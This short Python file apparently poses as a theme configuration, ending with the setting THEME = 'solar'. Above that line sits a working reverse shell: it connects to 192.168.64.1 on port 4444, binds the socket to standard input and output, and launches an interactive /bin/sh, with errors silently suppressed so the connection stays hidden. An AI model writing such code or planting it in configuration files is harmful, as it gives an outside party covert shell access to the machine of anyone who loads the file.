import socket, subprocess, os
try:
    s = socket.create_connection(("192.168.64.1", 4444), timeout=5)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
except Exception:
    pass
THEME = "solar"
